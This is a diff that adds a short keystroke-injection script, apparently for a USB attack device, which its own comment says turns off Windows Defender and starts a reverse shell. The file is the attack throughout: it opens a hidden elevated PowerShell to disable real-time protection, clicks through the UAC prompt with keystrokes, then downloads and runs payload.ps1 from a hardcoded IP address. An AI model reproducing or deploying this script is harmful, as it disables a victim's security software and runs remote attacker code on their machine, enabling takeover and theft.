@@ -1,0 +1,19 @@
+REM Turn off Windows Defender and start reverse shell
+
+
+GUI r
+DELAY 200
+REM Start an elevated powershell instance which will disable Windows Defender.
+STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+ENTER
+DELAY 200
+REM if you need administrator [left, enter and delay 1000]
+LEFT
+ENTER
+DELAY 200
+ALT y
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://178.79.149.140/payload.ps1');"
+ENTER
